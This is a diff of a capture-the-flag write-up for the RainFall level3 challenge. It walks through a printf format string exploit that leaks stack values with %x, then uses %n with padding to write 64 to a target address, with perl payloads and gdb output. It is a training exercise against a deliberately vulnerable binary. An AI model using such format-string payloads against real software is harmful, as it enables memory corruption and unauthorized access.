@@ -69,14 +69,31 @@ level3@RainFall:~$ cat /tmp/level3 | ./level3
 AAAA 00000200 b7fd1ac0 b7ff37d0 41414141
 ```
 
-Here we have read the first 16 bytes of the stack, and we know that the 4th converted argument that `printf` is the
+Here we have read the first 16 bytes of the stack, and we know that the 4th argument converted by `printf` is the
 address of the supplied string (`AAAA` => `41414141`).
 
 We can now use the `%n` conversion which prints the number of characters written so far by `printf` to write the value
 64 in the address `0x804988c`.
 
+To do so, we need to know how long our string is, then add extra characters to reach 64 bytes before the `%n`.
+
+Let's format the string with the address `0x804988c` and the conversions needed. We use gdb to see what value is written at this address.
+
 ```console
-level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x0812345678901234567890123456789012345678901%x%x%x%n"' > /tmp/level3
+level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x08%x%x%x%n"' > /tmp/level3
+level3@RainFall:~$ gdb ./level3
+Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
+gdb-peda$ b *0x080484df
+Breakpoint 1 at 0x80484df
+gdb-peda$ run < /tmp/level3
+Breakpoint 1, 0x080484df in v ()
+gdb-peda$ x/s $eax
+0x17:	 <Address 0x17 out of bounds>
+```
+The exploit has worked, the value written is 0x17, or 23 in decimal. Since we want to write 64, we'll add 41 extra characters to our string.
+
+```console
+level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%x%x%x%n"' > /tmp/level3
 level3@RainFall:~$ cat /tmp/level3 - | ./level3
 ...
 [hit return, some garbage display]
